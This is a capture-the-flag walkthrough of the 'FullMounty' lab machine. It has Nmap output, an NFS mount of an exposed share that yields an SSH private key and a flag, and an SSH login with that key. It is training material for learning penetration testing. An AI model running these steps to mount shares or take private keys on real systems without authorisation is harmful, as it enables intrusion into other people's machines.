---
description: Wizlynx PwnTillDawn Online FullMounty
---

# FullMounty (10.150.150.134)

## Nmap

{% code overflow="wrap" %}
```bash
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 5.3p1 Debian 3ubuntu7.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f6:e9:3f:cf:88:ec:7c:35:63:91:34:aa:14:55:49:cc (DSA)
|_  2048 20:1d:e9:90:6f:4b:82:a3:71:1e:a9:99:95:7f:31:ea (RSA)
111/tcp   open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      34154/tcp   mountd
|   100005  1,2,3      50354/udp   mountd
|   100021  1,3,4      45783/tcp   nlockmgr
|   100021  1,3,4      48262/udp   nlockmgr
|   100024  1          38840/udp   status
|_  100024  1          40110/tcp   status
2049/tcp  open  nfs      2-4 (RPC #100003)
8089/tcp  open  ssl/http Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-10-28T09:51:59
| Not valid after:  2022-10-27T09:51:59
| MD5:   20eb ae2c fb50 a924 c9a2 d40a 3d7e 4f75
|_SHA-1: 1878 ed48 2c88 eecb 2d1e 4fa1 4943 adf7 6c2b 6e8f
34154/tcp open  mountd   1-3 (RPC #100005)
40110/tcp open  status   1 (RPC #100024)
45783/tcp open  nlockmgr 1-4 (RPC #100021)
```
{% endcode %}

### FLAG49

Mount nfs to get ssh private key

```sh
mount -t nfs -o vers=3 10.150.150.134:/srv/exportnfs mountdir/
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /usr/lib/systemd/system/rpc-statd.service.
                                                                                                                                                             
┌──(root㉿kali)-[/tmp]
└─# ls -la mountdir             
total 36
drwxr-xr-x  5 nobody nogroup 4096 Oct 29  2019 .
drwxrwxrwt 25 root   root    4096 Jan 22 21:17 ..
-rw-------  1 nobody nogroup  667 Oct 29  2019 .bash_history
drwxr-xr-x  5 nobody nogroup 4096 Oct 29  2019 .config
-rw-r--r--  1 kali   kali      41 Oct 22  2019 FLAG49
-rw-r--r--  1 kali   kali    1675 Oct  3  2019 id_rsa
-rw-r--r--  1 kali   kali     397 Oct  3  2019 id_rsa.pub
drwxr-xr-x  3 nobody nogroup 4096 Oct 29  2019 .local
drwxr-xr-x  3 nobody nogroup 4096 Oct 29  2019 .mozilla

```

2. SSH into machine

{% code overflow="wrap" %}
```sh
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -oHostKeyAlgorithms=+ssh-dss -i id_rsa deadbeef@10.150.150.134
Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
Ubuntu 10.04.4 LTS

Welcome to Ubuntu!
 * Documentation:  https://help.ubuntu.com/
New release 'precise' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Aug 12 00:50:59 2020
deadbeef@FullMounty:~$ id
uid=1000(deadbeef) gid=1000(deadbeef) groups=4(adm),20(dialout),24(cdrom),46(plugdev),107(lpadmin),108(sambashare),109(admin),1000(deadbeef)
```
{% endcode %}
